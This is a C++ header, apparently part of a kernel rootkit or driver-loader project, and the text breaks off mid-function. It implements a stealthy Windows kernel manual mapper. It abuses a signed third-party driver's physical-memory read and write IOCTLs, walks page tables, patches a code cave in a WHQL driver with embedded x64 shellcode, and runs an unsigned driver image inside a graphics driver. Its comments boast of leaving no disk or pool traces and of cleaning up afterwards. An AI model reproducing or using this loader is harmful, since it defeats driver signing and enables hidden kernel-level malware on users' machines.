#pragma once
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include "common.h"
#include "protocol.h"
#include <windows.h>
#include <winioctl.h>
#include <psapi.h>
#include <algorithm>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <string>
#include <vector>

#pragma comment(lib, "psapi.lib")

// ============================================================================
// cave_mapper.h — In-Memory Kernel Manual Mapper via WHQL Code Cave (Branch 2B)
//
// Technical Highlights:
//   1. 100% In-Memory Deployment: The core driver PE binary (shellcode) is
//      never written to disk; it is section-mapped directly from memory.
//   2. Host Driver Selection: Automatically prioritizes large graphics drivers
//      (nvlddmkm.sys -> amdkmdag.sys -> igdkmd64.sys -> dxgkrnl.sys) as hosts.
//   3. Branch 2B Kernel Execution:
//      - Single invalid IOCTL triggers the WHQL driver default branch.
//      - Shellcode executes in kernel thread under Loader's current CR3.
//      - Allocates isolated physical pages via MmAllocatePagesForMdl (zero pool logs).
//      - Maps target PTEs using MmMapIoSpace and flips PFN with invlpg.
//      - Direct hardware 'rep movsb' copies the locked user-mode image into host.
//      - Constructs fake DRIVER_OBJECT and executes DriverEntry(fakeDriverObj, &bootConfig).
//      - Restores original default branch bytes and clears Code Cave memory.
//   4. Automated Cleanup: Unloads Machenike.sys service immediately upon launch.
// ============================================================================

// SipHash Key (aligned with drv/Main.cpp)
static const uint8_t g_CaveSipHashKey[16] = {
    0x21, 0x7A, 0xA9, 0x3C, 0x10, 0x55, 0xD2, 0x6F,
    0x9B, 0x4E, 0x01, 0x88, 0xC7, 0x33, 0xFA, 0x90
};
static const uint32_t g_CaveSalt4 = 0x4D43484EU; // 'MCHN'
static const uint64_t g_CaveStep  = 30;

// WHQL Driver IOCTL Codes
#define MACHENIKE_GET_INFO_IOCTRL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x503, METHOD_NEITHER, 3)
#define MACHENIKE_READ_IOCTRL     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x504, METHOD_NEITHER, 3)
#define MACHENIKE_WRITE_IOCTRL    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x505, METHOD_NEITHER, 3)
#define MACHENIKE_TRIGGER_IOCTRL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x50F, METHOD_NEITHER, 3)

// Headless Physical Canary Constants
#define DRV_CANARY_WINDOW_LOW   0x10000000ULL // 256MB
#define DRV_CANARY_WINDOW_HIGH  0x20000000ULL // 512MB
#define DRV_WSK_CANARY_MAGIC    0x57534B5F4C4F4144ULL // "WSK_LOAD"

#define DRV_CANARY_GUID_D1 0x57534B5FUL
#define DRV_CANARY_GUID_D2 0x4C4F
#define DRV_CANARY_GUID_D3 0x4144
#define DRV_CANARY_GUID_D4 { 0xB8, 0x99, 0xA1, 0xB2, 0xC3, 0xD4, 0xE5, 0xF6 }

#pragma pack(push, 1)
typedef struct _DRV_WSK_CANARY
{
    GUID     Signature;
    uint64_t Magic;
    uint64_t KernelImageVA;
    uint32_t ImageSize;
    uint32_t ProtocolVersion;
    uint64_t CanaryPhysAddr;
    uint64_t Timestamp;
    uint64_t Reserved;
} DRV_WSK_CANARY, *PDRV_WSK_CANARY;
#pragma pack(pop)

#ifndef DRV_TRANSPORT_TCP
#define DRV_TRANSPORT_TCP 2
#define DRV_TRANSPORT_UDP 3
#define DRV_TRANSPORT_USB 4
#define DRV_TRANSPORT_RAW_ETH 5
#endif

#pragma pack(push, 8)
typedef struct _MK_PHYS_RANGE
{
    LARGE_INTEGER BaseAddress;
    LARGE_INTEGER NumberOfBytes;
} MK_PHYS_RANGE;

typedef struct _WINPMEM_MEMORY_INFO
{
    LARGE_INTEGER CR3;
    LARGE_INTEGER NtBuildNumber;
    LARGE_INTEGER KernBase;
    LARGE_INTEGER KDBG;
    LARGE_INTEGER KPCR[64];
    LARGE_INTEGER PfnDataBase;
    LARGE_INTEGER PsLoadedModuleList;
    LARGE_INTEGER PsActiveProcessHead;
    LARGE_INTEGER NtBuildNumberAddr;
    LARGE_INTEGER Padding[0xfe];
    LARGE_INTEGER NumberOfRuns;
    MK_PHYS_RANGE Run[100];
} WINPMEM_MEMORY_INFO;

typedef struct _UNICODE_STRING_K
{
    USHORT Length;
    USHORT MaximumLength;
    uint32_t _pad;
    uint64_t Buffer;
} UNICODE_STRING_K;

typedef struct _KLDR_ENTRY_K
{
    uint64_t Flink;
    uint64_t Blink;
    uint64_t Reserved1[2];
    uint64_t NonPagedDebugInfo;
    uint64_t DllBase;
    uint64_t EntryPoint;
    uint32_t SizeOfImage;
    uint32_t _pad;
    UNICODE_STRING_K FullDllName;
    UNICODE_STRING_K BaseDllName;
} KLDR_ENTRY_K;
#pragma pack(pop)

// PTE bit definitions
#define PTE_PRESENT    (1ULL << 0)
#define PTE_RW         (1ULL << 1)
#define PTE_ACCESSED   (1ULL << 5)
#define PTE_DIRTY      (1ULL << 6)
#define PTE_PS         (1ULL << 7)
#define PTE_GLOBAL     (1ULL << 8)
#define PTE_PFN_MASK   0x000FFFFFFFFFF000ULL

static inline uint64_t rotl64_cave(uint64_t x, int b) {
    return (x << b) | (x >> (64 - b));
}

// ScopedThreadAffinity RAII
class ScopedCaveThreadAffinity {
public:
    explicit ScopedCaveThreadAffinity(DWORD_PTR preferredCoreMask = 0) {
        DWORD_PTR procMask = 0, sysMask = 0;
        if (GetProcessAffinityMask(GetCurrentProcess(), &procMask, &sysMask) && procMask != 0) {
            DWORD_PTR targetMask = preferredCoreMask;
            if (targetMask == 0 || (targetMask & procMask) == 0) {
                targetMask = procMask & (-static_cast<int64_t>(procMask));
            }
            m_oldMask = SetThreadAffinityMask(GetCurrentThread(), targetMask);
            if (m_oldMask != 0) {
                m_isBound = true;
                Sleep(0);
            }
        }
    }

    ~ScopedCaveThreadAffinity() {
        if (m_isBound && m_oldMask != 0) {
            SetThreadAffinityMask(GetCurrentThread(), m_oldMask);
        }
    }

    bool isBound() const { return m_isBound; }

private:
    DWORD_PTR m_oldMask = 0;
    bool      m_isBound = false;
};

// ============================================================================
// Shellcode & Parameters Specification (Branch 2B)
// ============================================================================

#pragma pack(push, 1)
// Core 20-byte boot config passed to DriverEntry in rdx
struct DRV_BOOT_CONFIG_CORE {
    uint32_t Magic;         // DRV_BOOT_CONFIG_MAGIC ('WSKC')
    uint32_t TransportMode; // 2 = WSK_TCP, 3 = WSK_UDP, 4 = USB
    uint16_t Port;          // 通信端口
    uint16_t Reserved;
    uint32_t AuthToken;     // 握手认证 Token
    uint32_t Flags;         // 特性开关
};

struct ShellcodeParams {
    uint64_t pfnMmAllocatePagesForMdl;    // 0x00 ntoskrnl!MmAllocatePagesForMdl
    uint64_t pfnMmMapIoSpace;             // 0x08 ntoskrnl!MmMapIoSpace
    uint64_t pfnMmUnmapIoSpace;           // 0x10 ntoskrnl!MmUnmapIoSpace
    uint64_t userImageVA;                 // 0x18 User-mode mapped image in Loader CR3
    uint64_t payloadTargetVA;             // 0x20 Target Kernel VA in host driver
    uint32_t imageSize;                   // 0x28 SizeOfImage
    uint32_t entryPointOffset;            // 0x2C DriverEntry offset
    uint32_t pageCount;                   // 0x30 Number of 4KB pages
    uint32_t status;                      // 0x34 NTSTATUS result
    uint64_t firstPtePA;                  // 0x38 First PTE physical address in host
    uint64_t hookReturnVA;                // 0x40 Return VA in WHQL driver
    uint64_t whqlDrvBase;                 // 0x48 Host driver base -> fakeDriverObj.DriverStart
    uint32_t whqlDrvSize;                 // 0x50 Host driver size -> fakeDriverObj.DriverSize
    uint32_t pad0;                        // 0x54 Alignment padding
    uint64_t whqlLdrEntryVA;              // 0x58 Host KLDR entry VA -> fakeDriverObj.DriverSection
    DRV_BOOT_CONFIG_CORE bootConfig;      // 0x60 (20 bytes) Boot params for DriverEntry
    uint32_t pad1;                        // 0x74 (4 bytes) Total: 120 bytes
};
#pragma pack(pop)
static_assert(sizeof(ShellcodeParams) == 120, "ShellcodeParams must be exactly 120 bytes (0x78)");

// Branch 2B Kernel Execution Shellcode (333 bytes)
static const uint8_t scBranch2B[] = {
    0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5B, 0x49, 0x83, 0xEB, 0x7D, 0x53, 0x56, 0x57, 0x41, 0x54, 
    0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x49, 0x8B, 0xDB, 0x48, 0x81, 0xEC, 0x48, 0x02, 0x00, 0x00, 
    0x48, 0x33, 0xC9, 0x48, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x4D, 0x33, 0xC0, 
    0x44, 0x8B, 0x4B, 0x28, 0xFF, 0x13, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xE6, 0x00, 0x00, 0x00, 0x4C, 
    0x8B, 0xE0, 0x48, 0x8B, 0x4B, 0x38, 0x8B, 0x43, 0x30, 0x48, 0xC1, 0xE0, 0x03, 0x48, 0x8B, 0xD0, 
    0x45, 0x33, 0xC0, 0xFF, 0x53, 0x08, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xC6, 0x00, 0x00, 0x00, 0x4C, 
    0x8B, 0xE8, 0x45, 0x33, 0xF6, 0x44, 0x3B, 0x73, 0x30, 0x7D, 0x28, 0x4B, 0x8B, 0x44, 0xF4, 0x30, 
    0x48, 0xC1, 0xE0, 0x0C, 0x48, 0x83, 0xC8, 0x63, 0x4B, 0x89, 0x44, 0xF5, 0x00, 0x48, 0x8B, 0x43, 
    0x20, 0x41, 0x8B, 0xCE, 0x48, 0xC1, 0xE1, 0x0C, 0x48, 0x03, 0xC1, 0x0F, 0x01, 0x38, 0x41, 0xFF, 
    0xC6, 0xEB, 0xD2, 0x49, 0x8B, 0xCD, 0x8B, 0x43, 0x30, 0x48, 0xC1, 0xE0, 0x03, 0x48, 0x8B, 0xD0, 
    0xFF, 0x53, 0x10, 0x48, 0x8B, 0x73, 0x18, 0x48, 0x8B, 0x7B, 0x20, 0x8B, 0x4B, 0x28, 0xF3, 0xA4, 
    0x48, 0x8B, 0x7B, 0x20, 0x48, 0xB8, 0x31, 0x30, 0x56, 0x52, 0x44, 0x4B, 0x53, 0x57, 0x48, 0x89, 
    0x07, 0x48, 0x8B, 0x43, 0x20, 0x48, 0x89, 0x47, 0x08, 0x8B, 0x43, 0x28, 0x89, 0x47, 0x10, 0x48, 
    0x8D, 0x7C, 0x24, 0x40, 0x33, 0xC0, 0xB9, 0x2A, 0x00, 0x00, 0x00, 0xF3, 0x48, 0xAB, 0x48, 0x8D, 
    0x7C, 0x24, 0x40, 0x66, 0xC7, 0x07, 0x04, 0x00, 0x66, 0xC7, 0x47, 0x02, 0x50, 0x01, 0x48, 0x8B, 
    0x43, 0x20, 0x48, 0x89, 0x47, 0x08, 0x48, 0x8B, 0x43, 0x48, 0x48, 0x89, 0x47, 0x18, 0x8B, 0x43, 
    0x50, 0x89, 0x47, 0x20, 0x48, 0x8B, 0x43, 0x58, 0x48, 0x89, 0x47, 0x28, 0x48, 0x8B, 0xCF, 0x48, 
    0x8D, 0x53, 0x60, 0x48, 0x8B, 0x43, 0x20, 0x4C, 0x63, 0x43, 0x2C, 0x49, 0x03, 0xC0, 0xFF, 0xD0, 
    0x89, 0x43, 0x34, 0xEB, 0x07, 0xC7, 0x43, 0x34, 0x01, 0x00, 0x00, 0xC0, 0x48, 0x81, 0xC4, 0x48, 
    0x02, 0x00, 0x00, 0x4C, 0x8B, 0x5B, 0x40, 0x8B, 0x5B, 0x34, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 
    0x41, 0x5C, 0x5F, 0x5E, 0x58, 0x48, 0x8B, 0x7C, 0x24, 0x38, 0x41, 0xFF, 0xE3
};
static const size_t scBranch2B_size = sizeof(scBranch2B);

struct WhqlPatchSite {
    uint64_t kernVA;
    uint64_t physAddr;
    uint8_t  original[64];
};

struct MappedImage {
    std::vector<uint8_t> Image;
    uint64_t KernelBase = 0;
    uint64_t EntryPointOffset = 0;
    uint32_t SizeOfImage = 0;
    uint32_t RelocDirRVA = 0;
    uint32_t RelocDirSize = 0;
    uint64_t OriginalImageBase = 0;
    uint32_t ExceptionDirRVA = 0;
    uint32_t ExceptionDirSize = 0;
};

// ============================================================================
// WHQL Driver I/O Primitives
// ============================================================================

static uint64_t SipHash24_Cave(const uint8_t key[16], const uint8_t* msg, size_t msgLen)
{
    uint64_t k0, k1;
    memcpy(&k0, key, 8);
    memcpy(&k1, key + 8, 8);

    uint64_t v0 = k0 ^ 0x736f6d6570736575ULL;
    uint64_t v1 = k1 ^ 0x646f72616e646f6dULL;
    uint64_t v2 = k0 ^ 0x6c7967656e657261ULL;
    uint64_t v3 = k1 ^ 0x7465646279746573ULL;

#define SIPROUND_CAVE \
    v0+=v1; v1=rotl64_cave(v1,13); v1^=v0; v0=rotl64_cave(v0,32); \
    v2+=v3; v3=rotl64_cave(v3,16); v3^=v2; \
    v0+=v3; v3=rotl64_cave(v3,21); v3^=v0; \
    v2+=v1; v1=rotl64_cave(v1,17); v1^=v2; v2=rotl64_cave(v2,32);

    size_t i = 0;
    while (i + 8 <= msgLen) {
        uint64_t m;
        memcpy(&m, msg + i, 8);
        v3 ^= m; SIPROUND_CAVE SIPROUND_CAVE v0 ^= m;
        i += 8;
    }
    uint64_t b = ((uint64_t)msgLen) << 56;
    size_t left = msgLen & 7;
    for (size_t j = left - 1; j < left; j--)
        b |= ((uint64_t)msg[i + j]) << (j * 8);
    v3 ^= b; SIPROUND_CAVE SIPROUND_CAVE v0 ^= b;
    v2 ^= 0xff;
    SIPROUND_CAVE SIPROUND_CAVE SIPROUND_CAVE SIPROUND_CAVE
    return v0 ^ v1 ^ v2 ^ v3;
#undef SIPROUND_CAVE
}

static uint32_t CalcToken_Cave(uint64_t counter, uint32_t pid)
{
    uint8_t msg[16] = {};
    memcpy(msg, &counter, 8);
    memcpy(msg + 8, &pid, 4);
    memcpy(msg + 12, &g_CaveSalt4, 4);
    uint64_t h = SipHash24_Cave(g_CaveSipHashKey, msg, sizeof(msg));
    return (uint32_t)(h ^ (h >> 32));
}

static HANDLE WhqlOpen_Cave()
{
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    uint64_t ft64 = ((uint64_t)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
    uint64_t sec = ft64 / 10000000ULL;
    if (sec >= 11644473600ULL) sec -= 11644473600ULL;
    uint64_t counter = sec / g_CaveStep;
    uint32_t pid = GetCurrentProcessId();

    for (int d = -1; d <= 1; d++) {
        uint32_t token = CalcToken_Cave((uint64_t)((int64_t)counter + d), pid);
        wchar_t path[128];
        swprintf_s(path, L"\\\\.\\Machenike\\%08X", token);
        HANDLE h = CreateFileW(path,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            DBG("[CaveMapper] Opened WHQL device handle successfully (token=0x%08X)", token);
            return h;
        }
    }
    DBG("[CaveMapper] Failed to open WHQL device handle, GLE=%lu", GetLastError());
    return INVALID_HANDLE_VALUE;
}

static bool WhqlGetInfo_Cave(HANDLE hDev, WINPMEM_MEMORY_INFO* pInfo)
{
    if (!pInfo) return false;
    memset(pInfo, 0, sizeof(*pInfo));

    SIZE_T allocSize = (sizeof(WINPMEM_MEMORY_INFO) + 0xFFF) & ~0xFFF;
    WINPMEM_MEMORY_INFO* pAlignedBuf = (WINPMEM_MEMORY_INFO*)VirtualAlloc(
        NULL, allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pAlignedBuf) return false;

    DWORD dwOut = 0;
    DWORD dummyIn = 0;
    BOOL ok = DeviceIoControl(hDev,
        MACHENIKE_GET_INFO_IOCTRL,
        &dummyIn, sizeof(dummyIn),
        pAlignedBuf, (DWORD)sizeof(WINPMEM_MEMORY_INFO),
        &dwOut, NULL);

    if (ok) {
        memcpy(pInfo, pAlignedBuf, sizeof(*pInfo));
    }
    VirtualFree(pAlignedBuf, 0, MEM_RELEASE);
    return ok != FALSE;
}

static bool WhqlReadPhys_Cave(HANDLE hDev, uint64_t physAddr, void* buf, size_t len)
{
    uint8_t* dst = (uint8_t*)buf;
    size_t done = 0;
    while (done < len) {
        size_t chunk = (std::min)((size_t)0x1000, len - done);
        LARGE_INTEGER pa;
        pa.QuadPart = (LONGLONG)(physAddr + done);
        DWORD dwOut = 0;
        BOOL ok = DeviceIoControl(hDev,
            MACHENIKE_READ_IOCTRL,
            &pa, sizeof(pa),
            dst + done, (DWORD)chunk,
            &dwOut, NULL);
        if (!ok) return false;
        done += (dwOut > 0) ? dwOut : chunk;
    }
    return true;
}

static bool WhqlWritePhys_Cave(HANDLE hDev, uint64_t physAddr, const void* buf, size_t len)
{
    const uint8_t* src = (const uint8_t*)buf;
    size_t done = 0;
    while (done < len) {
        size_t chunk = (std::min)((size_t)0x1000, len - done);
        LARGE_INTEGER pa;
        pa.QuadPart = (LONGLONG)(physAddr + done);
        DWORD dwOut = 0;
        BOOL ok = DeviceIoControl(hDev,
            MACHENIKE_WRITE_IOCTRL,
            &pa, sizeof(pa),
            (PVOID)(src + done), (DWORD)chunk,
            &dwOut, NULL);
        if (!ok) return false;
        done += chunk;
    }
    return true;
}

static bool WhqlTrigger_Cave(HANDLE hDev, uint32_t* pGle = nullptr)
{
    DWORD dwOut = 0;
    BOOL ok = DeviceIoControl(hDev,
        MACHENIKE_TRIGGER_IOCTRL,
        NULL, 0,
        NULL, 0,
        &dwOut, NULL);
    DWORD gle = GetLastError();
    if (pGle) *pGle = gle;
    return ok != FALSE;
}

static inline bool UnloadWhqlDriver_Cave(const wchar_t* serviceName = L"Machenike")
{
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;

    SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return true;
    }

    SERVICE_STATUS status = {};
    ControlService(hService, SERVICE_CONTROL_STOP, &status);

    for (int i = 0; i < 20; i++) {
        if (QueryServiceStatus(hService, &status) && status.dwCurrentState == SERVICE_STOPPED) {
            break;
        }
        Sleep(100);
    }

    DeleteService(hService);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    DBG("[CaveMapper] Unloaded '%ls' tool driver service successfully", serviceName);
    return true;
}

// ============================================================================
// Page Table Walking & Kernel VA Helpers
// ============================================================================

static inline uint64_t PfnToPhys_Cave(uint64_t pte) {
    return pte & PTE_PFN_MASK;
}

static bool VirtToPhys_Cave(HANDLE hDev, uint64_t cr3, uint64_t va, uint64_t* pPhysAddr)
{
    uint64_t pml4_idx = (va >> 39) & 0x1FF;
    uint64_t pdpt_idx = (va >> 30) & 0x1FF;
    uint64_t pd_idx   = (va >> 21) & 0x1FF;
    uint64_t pt_idx   = (va >> 12) & 0x1FF;
    uint64_t page_off = va & 0xFFF;

    uint64_t pml4_pa = (cr3 & PTE_PFN_MASK) + pml4_idx * 8;
    uint64_t pml4e = 0;
    if (!WhqlReadPhys_Cave(hDev, pml4_pa, &pml4e, 8) || !(pml4e & PTE_PRESENT)) return false;

    uint64_t pdpt_pa = PfnToPhys_Cave(pml4e) + pdpt_idx * 8;
    uint64_t pdpte = 0;
    if (!WhqlReadPhys_Cave(hDev, pdpt_pa, &pdpte, 8) || !(pdpte & PTE_PRESENT)) return false;
    if (pdpte & PTE_PS) {
        *pPhysAddr = PfnToPhys_Cave(pdpte) + (va & 0x3FFFFFFF);
        return true;
    }

    uint64_t pd_pa = PfnToPhys_Cave(pdpte) + pd_idx * 8;
    uint64_t pde = 0;
    if (!WhqlReadPhys_Cave(hDev, pd_pa, &pde, 8) || !(pde & PTE_PRESENT)) return false;
    if (pde & PTE_PS) {
        *pPhysAddr = PfnToPhys_Cave(pde) + (va & 0x1FFFFF);
        return true;
    }

    uint64_t pt_pa = PfnToPhys_Cave(pde) + pt_idx * 8;
    uint64_t pte = 0;
    if (!WhqlReadPhys_Cave(hDev, pt_pa, &pte, 8) || !(pte & PTE_PRESENT)) return false;

    *pPhysAddr = PfnToPhys_Cave(pte) + page_off;
    return true;
}

static bool GetPtePhysAddr_Cave(HANDLE hDev, uint64_t cr3, uint64_t va, uint64_t* outPtePA, uint64_t* outPteVal)
{
    uint64_t pml4_idx = (va >> 39) & 0x1FF;
    uint64_t pdpt_idx = (va >> 30) & 0x1FF;
    uint64_t pd_idx   = (va >> 21) & 0x1FF;
    uint64_t pt_idx   = (va >> 12) & 0x1FF;

    uint64_t pml4_pa = (cr3 & PTE_PFN_MASK) + pml4_idx * 8;
    uint64_t pml4e = 0;
    if (!WhqlReadPhys_Cave(hDev, pml4_pa, &pml4e, 8) || !(pml4e & PTE_PRESENT)) return false;

    uint64_t pdpt_pa = PfnToPhys_Cave(pml4e) + pdpt_idx * 8;
    uint64_t pdpte = 0;
    if (!WhqlReadPhys_Cave(hDev, pdpt_pa, &pdpte, 8) || !(pdpte & PTE_PRESENT)) return false;
    if (pdpte & PTE_PS) return false;

    uint64_t pd_pa = PfnToPhys_Cave(pdpte) + pd_idx * 8;
    uint64_t pde = 0;
    if (!WhqlReadPhys_Cave(hDev, pd_pa, &pde, 8) || !(pde & PTE_PRESENT)) return false;
    if (pde & PTE_PS) return false;

    uint64_t pt_pa = PfnToPhys_Cave(pde) + pt_idx * 8;
    if (outPtePA) *outPtePA = pt_pa;

    if (outPteVal) {
        uint64_t val = 0;
        if (WhqlReadPhys_Cave(hDev, pt_pa, &val, 8)) {
            *outPteVal = val;
        } else {
            *outPteVal = 0;
        }
    }
    return true;
}

static bool ReadKernelVA_Cave(HANDLE hDev, uint64_t cr3, uint64_t va, void* buf, size_t len)
{
    uint8_t* dst = (uint8_t*)buf;
    size_t done = 0;
    while (done < len) {
        uint64_t curVA = va + done;
        uint64_t pageOff = curVA & 0xFFF;
        size_t canRead = (std::min)(0x1000 - (size_t)pageOff, len - done);

        uint64_t pa = 0;
        if (!VirtToPhys_Cave(hDev, cr3, curVA, &pa)) return false;
        if (!WhqlReadPhys_Cave(hDev, pa, dst + done, canRead)) return false;

        done += canRead;
    }
    return true;
}

static bool WriteKernelVA_Cave(HANDLE hDev, uint64_t cr3, uint64_t va, const void* buf, size_t len)
{
    const uint8_t* src = (const uint8_t*)buf;
    size_t done = 0;
    while (done < len) {
        uint64_t curVA = va + done;
        uint64_t pageOff = curVA & 0xFFF;
        size_t canWrite = (std::min)(0x1000 - (size_t)pageOff, len - done);

        uint64_t pa = 0;
        if (!VirtToPhys_Cave(hDev, cr3, curVA, &pa)) return false;
        if (!WhqlWritePhys_Cave(hDev, pa, src + done, canWrite)) return false;

        done += canWrite;
    }
    return true;
}

static uint64_t FindKernelExport_Cave(HANDLE hDev, uint64_t cr3, uint64_t kernBase, const char* funcName)
{
    uint8_t dosHdr[0x40] = {};
    if (!ReadKernelVA_Cave(hDev, cr3, kernBase, dosHdr, sizeof(dosHdr))) return 0;
    if (*(uint16_t*)dosHdr != 0x5A4D) return 0;

    uint32_t e_lfanew = *(uint32_t*)(dosHdr + 0x3C);
    uint8_t ntHdr[0x18 + 0xF0] = {};
    if (!ReadKernelVA_Cave(hDev, cr3, kernBase + e_lfanew, ntHdr, sizeof(ntHdr))) return 0;
    if (*(uint32_t*)ntHdr != 0x00004550) return 0;

    uint32_t exportRVA = *(uint32_t*)(ntHdr + 0x18 + 0x70);
    if (!exportRVA) return 0;

    uint8_t expDir[0x28] = {};
    if (!ReadKernelVA_Cave(hDev, cr3, kernBase + exportRVA, expDir, sizeof(expDir))) return 0;

    uint32_t numNames    = *(uint32_t*)(expDir + 0x18);
    uint32_t addrOfFuncs = *(uint32_t*)(expDir + 0x1C);
    uint32_t addrOfNames = *(uint32_t*)(expDir + 0x20);
    uint32_t addrOfOrds  = *(uint32_t*)(expDir + 0x24);

    for (uint32_t i = 0; i < numNames; i++) {
        uint32_t nameRVA = 0;
        if (!ReadKernelVA_Cave(hDev, cr3, kernBase + addrOfNames + i * 4, &nameRVA, 4)) continue;

        char name[128] = {};
        ReadKernelVA_Cave(hDev, cr3, kernBase + nameRVA, name, sizeof(name) - 1);

        if (strcmp(name, funcName) == 0) {
            uint16_t ord = 0;
            ReadKernelVA_Cave(hDev, cr3, kernBase + addrOfOrds + i * 2, &ord, 2);
            uint32_t funcRVA = 0;
            ReadKernelVA_Cave(hDev, cr3, kernBase + addrOfFuncs + ord * 4, &funcRVA, 4);
            return kernBase + funcRVA;
        }
    }
    return 0;
}

static uint64_t ResolveNtosExport_Cave(HANDLE hDev, uint64_t cr3, uint64_t ntoskrnlBase, const char* name)
{
    wchar_t sysPath[MAX_PATH] = {};
    GetSystemDirectoryW(sysPath, MAX_PATH);
    wcscat_s(sysPath, L"\\ntoskrnl.exe");

    HMODULE hNtos = LoadLibraryExW(sysPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) {
        hNtos = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    }
    if (hNtos) {
        FARPROC proc = GetProcAddress(hNtos, name);
        if (proc) {
            uint32_t rva = (uint32_t)((uint8_t*)proc - (uint8_t*)hNtos);
            FreeLibrary(hNtos);
            return ntoskrnlBase + rva;
        }
        FreeLibrary(hNtos);
    }
    return FindKernelExport_Cave(hDev, cr3, ntoskrnlBase, name);
}

// ============================================================================
// In-Memory PE Mapping & Relocation
// ============================================================================

#define PE_DOS_CAVE(buf)   ((IMAGE_DOS_HEADER*)(buf))
#define PE_NT_CAVE(buf)    ((IMAGE_NT_HEADERS64*)((uint8_t*)(buf) + PE_DOS_CAVE(buf)->e_lfanew))
#define PE_SECHDR_CAVE(nt) ((IMAGE_SECTION_HEADER*)((uint8_t*)&(nt)->OptionalHeader + (nt)->FileHeader.SizeOfOptionalHeader))

static bool SectionMap_Cave(const std::vector<uint8_t>& rawBuf, MappedImage& out)
{
    if (rawBuf.size() < sizeof(IMAGE_DOS_HEADER)) return false;
    auto* dos = PE_DOS_CAVE(rawBuf.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    if (dos->e_lfanew >= (LONG)rawBuf.size() || dos->e_lfanew < 0) return false;

    auto* nt = PE_NT_CAVE(rawBuf.data());
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        DBG("[CaveMapper] Error: Driver image is not x64 PE");
        return false;
    }

    out.SizeOfImage        = nt->OptionalHeader.SizeOfImage;
    out.EntryPointOffset   = nt->OptionalHeader.AddressOfEntryPoint;
    out.RelocDirRVA        = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    out.RelocDirSize       = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    out.ExceptionDirRVA    = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    out.ExceptionDirSize   = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
    out.OriginalImageBase  = nt->OptionalHeader.ImageBase;
    out.Image.assign(out.SizeOfImage, 0);

    // Copy PE headers
    uint32_t hdrSize = nt->OptionalHeader.SizeOfHeaders;
    memcpy(out.Image.data(), rawBuf.data(), (std::min)(hdrSize, (uint32_t)rawBuf.size()));

    // Copy sections
    auto* sec = PE_SECHDR_CAVE(nt);
    for (uint16_t i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!sec->VirtualAddress || !sec->SizeOfRawData) continue;
        if (sec->PointerToRawData + sec->SizeOfRawData > rawBuf.size()) {
            DBG("[CaveMapper] Section '%s' out of bounds", sec->Name);
            return false;
        }
        memcpy(out.Image.data() + sec->VirtualAddress,
               rawBuf.data() + sec->PointerToRawData,
               sec->SizeOfRawData);
    }
    DBG("[CaveMapper] SectionMap complete: %u bytes, EntryPoint=+0x%llX", out.SizeOfImage, out.EntryPointOffset);
    return true;
}

static inline bool ApplyRelocation_Cave(MappedImage& img, uint64_t kernelBase)
{
    uint64_t origBase = img.OriginalImageBase;
    if (origBase == 0) {
        auto* nt = PE_NT_CAVE(img.Image.data());
        if (nt && nt->Signature == IMAGE_NT_SIGNATURE) {
            origBase = nt->OptionalHeader.ImageBase;
        }
    }
    uint64_t delta = kernelBase - origBase;
    if (delta == 0) return true;

    uint32_t relocRVA  = img.RelocDirRVA;
    uint32_t relocSize = img.RelocDirSize;
    if (!relocRVA || !relocSize) return true;

    uint8_t* reloc    = img.Image.data() + relocRVA;
    uint8_t* relocEnd = reloc + relocSize;

    while (reloc < relocEnd) {
        auto* block = (IMAGE_BASE_RELOCATION*)reloc;
        if (!block->SizeOfBlock) break;

        uint32_t  count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
        uint16_t* entry = (uint16_t*)(reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (uint32_t i = 0; i < count; i++) {
            uint16_t type   = entry[i] >> 12;
            uint16_t offset = entry[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                uint64_t* pAddr = (uint64_t*)(img.Image.data() + block->VirtualAddress + offset);
                *pAddr += delta;
            }
        }
        reloc += block->SizeOfBlock;
    }
    img.KernelBase = kernelBase;
    return true;
}

static uint64_t FindLoadedDriverBase_Cave(const char* moduleName)
{
    LPVOID drivers[1024];
    DWORD cbNeeded = 0;
